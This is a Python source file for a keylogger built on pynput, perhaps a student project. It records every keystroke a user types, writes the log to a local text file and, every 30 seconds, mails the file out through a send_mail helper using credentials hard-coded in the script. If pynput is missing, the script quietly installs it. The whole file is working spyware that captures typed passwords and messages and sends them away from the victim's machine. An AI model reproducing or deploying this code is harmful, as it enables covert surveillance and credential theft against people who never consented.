try: #import necessary libraries
    import threading
    from threading import Timer
    from pynput.keyboard import Listener as keyboardListener
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/KeyOutput.txt"
    TYPE = "Keylogging Data"

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def report(self):
            f=open(FILENAME,"a")
            f.write(self.log)
            f.close()
            send_mail(self.email, self.password, FILENAME, TYPE)
            self.log = ""
            # timer = threading.Timer(self.interval, self.report)
            # timer.start()

        def run(self):
            keyboard_listener = keyboardListener(on_press=self.save_data)
            with keyboard_listener:
                timer = threading.Timer(self.interval, self.report)
                timer.start()
                Timer(SEND_REPORT_EVERY, keyboard_listener.stop).start()
                # self.report()
                keyboard_listener.join()


    